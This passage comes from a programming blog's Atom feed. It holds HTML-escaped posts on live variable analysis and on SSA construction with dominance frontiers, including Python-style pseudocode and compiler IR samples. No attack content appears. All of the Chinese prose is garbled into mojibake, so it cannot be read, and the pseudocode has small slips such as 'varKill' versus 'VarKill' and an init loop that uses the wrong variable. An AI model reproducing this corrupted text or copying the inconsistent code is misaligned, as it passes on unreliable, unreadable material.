  &lt;li&gt;æ”¶é›†åˆå§‹ä¿¡æ¯ â€“ é€šè¿‡ä¸€ä¸ªpassæ¥åˆå§‹åŒ– &lt;em&gt;UEVar&lt;/em&gt; å’Œ &lt;em&gt;VarKill&lt;/em&gt;&lt;/li&gt;
  &lt;li&gt;æ±‚ä¸åŠ¨æ–¹ç¨‹ â€“ é€šè¿‡å¤šè¶Ÿpassæ¥è¿­ä»£ï¼Œè®¡ç®—LiveOuté›†åˆï¼Œæœ€åè¾¾åˆ°ä¸åŠ¨ç‚¹ã€‚&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;å…·ä½“å®ç°çš„ä¼ªä»£ç å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;æ”¶é›†åˆå§‹ä¿¡æ¯&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# assume block b has k operations
# of form &quot;x = y op z&quot;
&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;# Collect initial info
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UEVar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;null&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VarKill&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;null&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VarKill&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;VarKill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UEVar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;varKill&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UEVar&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# init every block
&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;Init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;æ±‚è§£ä¸åŠ¨æ–¹ç¨‹&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# assume CFG has N blocks
# numbered 0 to N - 1
&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;GetLiveOutPass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cfg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;cfg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LiveOut&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;null&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;changed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;true&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;changed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;changed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;false&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;cfg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LiveOut&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cfg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LiveOut&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recompute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cfg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LiveOut&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;changed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;changed&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;true&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>dyf</name><email>dyf.auroa@gmail.com</email></author><category term="program analysis" /><summary type="html">â€ƒâ€ƒã€ŠEngineering a Compilerã€‹ä¸­çš„8.6.1ç« ä»‹ç»äº†ä¸€ç§æ•°æ®æµåˆ†æç®—æ³•ï¼ŒLive variable analysisï¼Œå³æ´»åŠ¨å˜é‡åˆ†æï¼Œè¿™ç§æŠ€æœ¯å¯ä»¥ç”¨æ¥æ£€æµ‹æœªåˆå§‹åŒ–å˜é‡çš„ä½¿ç”¨ã€‚ç¼–è¯‘å™¨æˆ–è€…ä»£ç æ‰«æå™¨å¯ä»¥å‘ç°å¹¶æŠ¥å‘Šè¿™ç§æ¼æ´ã€‚</summary></entry><entry><title type="html">SSAç›¸å…³çŸ¥è¯†(1)â€“Dominator Frontier</title><link href="http://localhost:4000/blog/ssa1" rel="alternate" type="text/html" title="SSAç›¸å…³çŸ¥è¯†(1)--Dominator Frontier" /><published>2020-07-09T00:00:00+08:00</published><updated>2020-07-09T00:00:00+08:00</updated><id>http://localhost:4000/blog/ssa1</id><content type="html" xml:base="http://localhost:4000/blog/ssa1">&lt;p&gt;â€ƒâ€ƒå’Œå¥½å“¥ä»¬ä¸€èµ·å‚åŠ äº†æ¯•æ˜‡æ¯ç¼–è¯‘ç³»ç»Ÿå¤§èµ›ï¼Œè¦æ‰‹æ’•ä¸€ä¸ªç¼–è¯‘å™¨ï¼Œé‚¢ç¥å¸¦æˆ‘ä»¬æï¼ŒæŒ‰ç…§llvmçš„ç»“æ„è¿›è¡Œè®¾è®¡ï¼Œå¹¶ä¸”æŠŠ&lt;a href=&quot;https://github.com/MaxXSoft/YuLang&quot;&gt;YuLang&lt;/a&gt;çš„éƒ¨åˆ†ä»£ç ç›´æ¥è¿ç§»äº†è¿‡æ¥ï¼Œæˆ‘ç›®å‰çš„æ„Ÿå—æ˜¯ï¼Œè¿™ä¸ªé¡¹ç›®çš„æ‰©å±•æ€§çœŸçš„å¥½ã€‚æˆ‘ä¸»è¦è´Ÿè´£å¹³å°æ— å…³ä¼˜åŒ–ï¼Œç”±äºå­˜åœ¨PassManagerè¿™ç§ç»“æ„ï¼Œæ‰€ä»¥æˆ‘åªéœ€è¦å†™ç›¸å…³çš„passå³å¯å®Œæˆä¼˜åŒ–ï¼Œä¸å¾—ä¸è¯´è¿™ç§è®¾è®¡æ˜¯çœŸçš„ç¥å¥‡ã€‚&lt;/p&gt;

&lt;p&gt;â€ƒâ€ƒç”±äºå‰ç«¯ç›´æ¥ç”ŸæˆSSAè¾ƒä¸ºå¤æ‚ï¼Œå› æ­¤yulangçš„å˜é‡åˆ†é…å¹¶ä¸æ˜¯çº¯SSAï¼Œä½¿ç”¨alloc/storeçš„æ–¹å¼æ¥è§„é¿phièŠ‚ç‚¹ç­‰å…¶ä»–é—®é¢˜ï¼Œè¿™ä¹Ÿæ˜¯llvmæ‰€æ”¯æŒçš„IR(å¦‚ä¸‹ä»£ç )ã€‚å› ä¸ºLLVMæœ¬èº«å…·æœ‰ä¸€ä¸ª&lt;a href=&quot;https://github.com/llvm-mirror/llvm/blob/master/lib/Transforms/Utils/Mem2Reg.cpp&quot;&gt;mem2reg&lt;/a&gt;çš„passæ¥å®ç°å°†allocè½¬ä¸ºå¯„å­˜å™¨å˜é‡ã€‚æˆ‘æ¥ä¸‹æ¥ä¹Ÿè¦å®ç°è¿™ä¸ªpassç„¶åæ‰èƒ½è¿›ä¸€æ­¥ä¼˜åŒ–ã€‚&lt;/p&gt;

&lt;div class=&quot;language-scala highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;i32&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;i32&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¯¹åº”çš„IRï¼š&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-ir&quot;&gt;define internal $0f$i32 @_$b_ {
@args:
  %1 = alloca $pi32
  jump %0
@func_exit: ; preds: %0
  %2 = load i32, $pi32 %1
  return i32 %2
%0: ; preds: @args
  %3 = alloca $p$3ai32
  %4 = access elem $p$3ai32 %3, constant i32 1
  store i32 constant i32 2, $pi32 %4
  store i32 constant i32 0, $pi32 %1
  jump @func_exit
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;ssaç®€ä»‹&quot;&gt;SSAç®€ä»‹&lt;/h3&gt;

&lt;hr /&gt;

&lt;p&gt;â€ƒâ€ƒSSAï¼ˆstatic single assignment formï¼‰å³é™æ€å•èµ‹å€¼ï¼Œä¹‹æ‰€ä»¥ç§°ä¹‹ä¸ºå•èµ‹å€¼ï¼Œæ˜¯å› ä¸ºæ¯ä¸ªåå­—åœ¨SSAä¸­ä»…è¢«èµ‹å€¼ä¸€æ¬¡ã€‚ä»–çš„å¥½å¤„ä¸»è¦ä½“ç°åœ¨ï¼šå…¶ &lt;strong&gt;Use-Define chain&lt;/strong&gt; ç›¸å½“æ˜ç¡®ï¼Œè€Œä¸”æ¯ä¸ªä»…åŒ…å«å•ä¸€å…ƒç´ ã€‚å…³äºUse-Defineå¯ä»¥çœ‹è¿™å‡ ä¸ª&lt;a href=&quot;https://www.zhihu.com/question/41999500&quot;&gt;çŸ¥ä¹å›ç­”&lt;/a&gt;ã€‚ä¸¾ä¾‹æ¥è¯´ï¼š&lt;/p&gt;

&lt;div class=&quot;language-scala highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;â€ƒâ€ƒä»ä¸Šé¢çš„æè¿°æ‰€çŸ¥ï¼Œç¬¬ä¸€è¡Œèµ‹å€¼è¡Œä¸ºæ˜¯ä¸éœ€è¦çš„ï¼Œå› ä¸ºyåœ¨ç¬¬äºŒè¡Œè¢«äºŒåº¦èµ‹å€¼ï¼Œyçš„æ•°å€¼åœ¨ç¬¬ä¸‰è¡Œè¢«ä½¿ç”¨ï¼Œä¸€ä¸ªç¨‹å¼é€šå¸¸ä¼šè¿›è¡Œå®šä¹‰å¯è¾¾æ€§åˆ†æï¼ˆreaching definition analysisï¼‰æ¥æµ‹å®šå®ƒã€‚åœ¨SSAä¸‹ï¼Œå°†ä¼šå˜æˆä¸‹åˆ—çš„å½¢å¼ï¼š&lt;/p&gt;

&lt;div class=&quot;language-scala highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;n&quot;&gt;y1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;y2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;x1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y2&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;â€ƒâ€ƒåŸºäºè¿™ç§å½¢å¼çš„IRï¼Œæˆ‘ä»¬å†åšå¸¸é‡ä¼ æ’­ã€decç­‰ä¼˜åŒ–å°±ä¼šå˜å¾—æ›´åŠ ç®€å•ã€‚æˆ‘è¿™æœ€è¿‘ä¸€ç›´åœ¨è¯»ã€ŠEngineering a Compilerã€‹è¿™æœ¬ä¹¦ï¼Œåœ¨ç¬¬9ç« &lt;strong&gt;æ•°æ®æµåˆ†æ&lt;/strong&gt;éƒ¨åˆ†æ‰è®²äº†SSAçš„æ„é€ æ–¹å¼ï¼Œæˆ‘ä¹‹å‰çœ‹ç¬¬5ç« IRéƒ¨åˆ†çš„æ—¶å€™æ²¡å­¦ä¼šï¼Œä¸€ç›´ä»¥ä¸ºæ˜¯æ™ºåŠ›é—®é¢˜â€¦åæ¥æ‰çŸ¥é“é‚£åªæ˜¯ä¸ªæ¦‚å¿µä»‹ç»ã€‚&lt;/p&gt;

&lt;h3 id=&quot;0x01-ssaæ„é€ ç®—æ³•&quot;&gt;0x01 SSAæ„é€ ç®—æ³•&lt;/h3&gt;

&lt;hr /&gt;

&lt;h4 id=&quot;ç»å…¸æ„é€ æ³•&quot;&gt;ç»å…¸æ„é€ æ³•&lt;/h4&gt;
&lt;p&gt;æœ¬ä¹¦ä¸­ä»‹ç»çš„ç®—æ³•æ˜¯ç›¸å½“ç»å…¸çš„ç®—æ³•ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥çœ‹è®ºæ–‡ã€ŠEfficiently computing static single assignment form and the control dependence graphã€‹ï¼Œå¤§æ¦‚å°±æ˜¯ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;éå† IR æ„é€  CFG&lt;/li&gt;
  &lt;li&gt;è®¡ç®—æ”¯é…è¾¹ç•Œ&lt;/li&gt;
  &lt;li&gt;ç¡®å®š Phi(Î¦) å‡½æ•°ä½ç½®&lt;/li&gt;
  &lt;li&gt;å˜é‡é‡å‘½å&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;å…³äº&lt;strong&gt;CFG&lt;/strong&gt;çš„æ„é€ ç®—æ³•ï¼Œå¤§è‡´å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Basic Block&lt;/em&gt;æ„é€ ç®—æ³•ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;æ‰¾åŸºæœ¬å—å…¥å£æºä»£ç çš„é¦–è¡Œæˆ–è€…è½¬ç§»ä»£ç ï¼ˆæœ‰æ¡ä»¶å’Œæ— æ¡ä»¶ï¼‰æˆ–è€…è½¬ç§»ä»£ç çš„ä¸‹ä¸€è¡Œ&lt;/li&gt;
  &lt;li&gt;åŸºæœ¬å—æ„é€ ï¼šé€šè¿‡å…¥å£ç‚¹å¼€å§‹ï¼Œå°†å…¶ç»„æˆå„è‡ªçš„åŸºæœ¬å—ã€‚åŸºæœ¬å—è¯­å¥åºåˆ—çš„ç‰¹å¾ï¼šä»ä¸åŒ…å«å®ƒæœ¬èº«çš„è¿›å…¥ç‚¹åˆ°å…¶ä»–è¿›å…¥ç‚¹æˆ–è€…åˆ°æŸæ¡è½¬ç§»è¯­å¥æˆ–è€…åˆ°æŸæ¡åœæ­¢è¯­å¥&lt;/li&gt;
  &lt;li&gt;å¦‚æœæœ‰è¯­å¥ä¸åœ¨ä»»ä¸€åŸºæœ¬å—ä¸­ï¼Œé‚£ä¹ˆå®ƒä¸º â€æ­»ä»£ç â€œï¼Œåˆ é™¤&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;å½“ç¡®å®šBasic Blockåï¼Œç´§æ¥ç€æ„é€  CFG:&lt;/p&gt;

&lt;p&gt;å¦‚æœåœ¨ä¸€ä¸ªæœ‰åºä»£ç ä¸­ï¼ŒåŸºæœ¬å— B2 è·Ÿåœ¨ B1 åï¼Œé‚£ä¹ˆäº§ç”Ÿä¸€ä¸ªç”± B1 åˆ° B2 çš„æœ‰å‘è¾¹ã€‚&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;æœ‰è·³è½¬ç‚¹ã€‚è¿™ä¸ªç‚¹ä» B1 çš„ç»“æŸç‚¹è·³åˆ° B2 çš„å¼€å§‹ç‚¹&lt;/li&gt;
  &lt;li&gt;æ— è·³è½¬ç‚¹ï¼ˆæœ‰åºä»£ç ä¸­ï¼‰ï¼ŒB2 è·Ÿåœ¨ B1 åï¼Œä¸” B1 çš„ç»“æŸç‚¹ä¸æ˜¯æ— æ¡ä»¶è·³è½¬è¯­å¥&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;è¿™é‡Œæ¨èå»å¬bç«™ææ¨¾è€å¸ˆçš„ã€Šè½¯ä»¶åˆ†æã€‹è¯¾ç¨‹ï¼Œè®²çš„éå¸¸å¥½ã€‚&lt;/p&gt;

&lt;p&gt;æ¥ä¸‹æ¥æ˜¯è®¡ç®—æ”¯é…è¾¹ç•Œï¼Œåœ¨ç”ŸæˆSSAçš„æ—¶å€™ï¼Œéœ€è¦è®¡ç®—åœ¨ä½•å¤„æ’å…¥æ­£ç¡®çš„ Î¦ (phi-function)ã€‚ä¾‹å¦‚ï¼š&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æ­¤æ—¶å½¢æˆçš„IRåº”è¯¥æ˜¯è¿™æ ·çš„ï¼š&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-ir&quot;&gt;  branch %b0, %1, %2
@if_end: ; preds: %1, %2
  b1 = phi(a1, a2)
  store i32 constant i32 0, $pi32 %3
  jump @func_exit
%1: ; preds: %0
  a1 = a0 + 1
  jump @if_end
%2: ; preds: %0
  a2 = a0 - 1
  jump @if_end
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;cfgå¤§è‡´å¦‚ä¸‹ï¼š
&lt;img src=&quot;http://pic.dyf.ink/1-2020-7-09.png&quot; alt=&quot;cfg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;â€ƒâ€ƒè¿™é‡Œå¯ä»¥å‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œ&lt;code class=&quot;highlighter-rouge&quot;&gt;b = a&lt;/code&gt;èµ‹å€¼çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦ç¡®å®šåˆ°åº•æ˜¯é€‰æ‹©a1è¿˜æ˜¯a2,å› æ­¤éœ€è¦æ’å…¥ä¸€ä¸ªphiå‡½æ•°ã€‚è®¡ç®—åœ¨ä½•å¤„æ’å…¥æ­£ç¡®çš„ Î¦ ï¼Œä¸€ç§æ–¹æ³•æ˜¯åœ¨æ‰€æœ‰æœ‰å¤šä¸ªå‰é©±çš„Basic Blockçš„å¼€å¤´æ’å…¥ Î¦-nodeï¼Œä½†æ˜¯è¿™ç§æ–¹æ³•ä¼šæ’å…¥å¾ˆå¤šçš„æ— ç”¨çš„ Î¦-node ï¼Œæœ‰å¾ˆå¤š Î¦-node çš„å‚æ•°éƒ½æ˜¯ç›¸åŒçš„ä¸€ä¸ªå®šä¹‰ã€‚&lt;/p&gt;

&lt;p&gt;â€ƒâ€ƒè¿™æ ·å¾—åˆ°çš„ SSA å½¢å¼çš„ IRï¼Œå ç”¨è¿‡å¤šçš„å†…å­˜ï¼Œå¢åŠ äº†è®¡ç®—çš„å¼€é”€ã€‚ä»»ä½•ä½¿ç”¨è¯¥SSAè¿›è¡Œä»£ç åˆ†ææˆ–è€…ä¼˜åŒ–çš„è¿‡ç¨‹éƒ½ä¼šæµªè´¹å¾ˆå¤šè®¡ç®—èµ„æºã€‚ä¸ºäº†å‡å°‘ Î¦-function çš„æ•°é‡ï¼Œé¦–å…ˆæƒ³åˆ°çš„æ–¹æ³•å°±æ˜¯ç¡®å®šæ’å…¥ Î¦-function çš„ç²¾ç¡®ä½ç½®ã€‚&lt;/p&gt;

